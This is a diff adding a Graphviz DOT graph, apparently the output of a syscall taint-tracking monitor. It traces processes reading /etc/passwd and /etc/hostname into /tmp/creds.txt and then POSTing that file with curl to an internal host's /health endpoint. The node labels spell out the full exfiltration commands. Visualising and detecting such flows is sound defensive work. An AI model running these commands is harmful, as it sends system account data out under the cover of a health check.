@@ -1,0 +1,45 @@
+digraph syscon {
+  rankdir=LR;
+  bgcolor="#fafafa";
+  newrank=true;
+  node [fontname="monospace", fontsize=9, margin="0.15,0.1"];
+  edge [fontname="monospace", fontsize=8];
+  graph [nodesep=0.4, ranksep=0.6];
+
+  // Process nodes
+  p2626126 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#c8e6c9" COLOR="#2e7d32" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>sh</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ sh -c \n    curl -sf -X POST<BR/>  http://172.17.0.3:8080/health        <BR/>  -H 'Content-Type: application/json'   <BR/>       -d @/tmp/creds.txt\n</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2626126 | action #2</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 100%</FONT></TD></TR></TABLE>>];
+  p2626088 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#bbdefb" COLOR="#1565c0" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>sh</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ sh -c \n    cat /etc/passwd &gt;<BR/>  /tmp/creds.txt\n    cat /etc/hostname<BR/>  &gt;&gt; /tmp/creds.txt\n</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2626088 | action #1</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 100%</FONT></TD></TR></TABLE>>];
+  p2626132 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#cbe6cc" COLOR="#2e7d32" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>curl</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ curl -sf -X POST<BR/>  http://172.17.0.3:8080/health -H<BR/>  Content-Type: application/json -d<BR/>  @/tmp/creds.txt</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2626132 | action #2</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2626094 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#bfdff9" COLOR="#1565c0" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>cat</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ cat /etc/passwd</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2626094 | action #1</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2626095 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#bfdff9" COLOR="#1565c0" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>cat</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ cat /etc/hostname</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2626095 | action #1</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2625830 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#e8e8e8" COLOR="#999999" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>sleep</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ sleep 300</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2625830 | action #0</FONT></TD></TR></TABLE>>];
+  { rank=same; p2625830; p2626126; p2626088 }
+
+  // File nodes (data flow mediators)
+  f13789497318489331601 [shape=ellipse, label="/etc/passwd", fillcolor="#ffcdd2", style=filled, color="#666666"];
+  f6070035272040062963 [shape=ellipse, label="/tmp/creds.txt", fillcolor="#e3f2fd", style=filled, color="#666666"];
+
+  // Network endpoints
+  n4837715144102865214 [shape=diamond, label="172.17.0.3:8080", fillcolor="#ffe0e0", style=filled, color="#cc0000"];
+
+  // Fork/spawn edges
+  p2626088 -> p2626094 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2626088 -> p2626095 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2626126 -> p2626132 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2626088 -> p2626132 [label="file", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+
+  // Data flow edges
+  f13789497318489331601 -> p2626094 [label="read", color="#1565c0", fontcolor="#1565c0"];
+  f13789497318489331601 -> p2626132 [label="read", color="#1565c0", fontcolor="#1565c0"];
+  p2626088 -> f6070035272040062963 [label="write", color="#2e7d32", fontcolor="#2e7d32", penwidth=1.5];
+  f6070035272040062963 -> p2626132 [label="read", color="#1565c0", fontcolor="#1565c0"];
+  // Network edges
+  p2626132 -> n4837715144102865214 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+
+  // Legend
+  subgraph cluster_legend {
+    label="Legend"; style=rounded; color="#cccccc"; fontsize=10;
+    node [shape=plaintext, fontsize=8];
+    legend [label=<<TABLE BORDER="0" CELLBORDER="1" CELLSPACING="0"><TR><TD BGCOLOR="#bbdefb">Action #1: bash: cat /etc/passwd &amp;&amp; cat /</TD></TR><TR><TD BGCOLOR="#c8e6c9">Action #2: bash: curl -X POST http://172.</TD></TR></TABLE>>];
+  }
+}
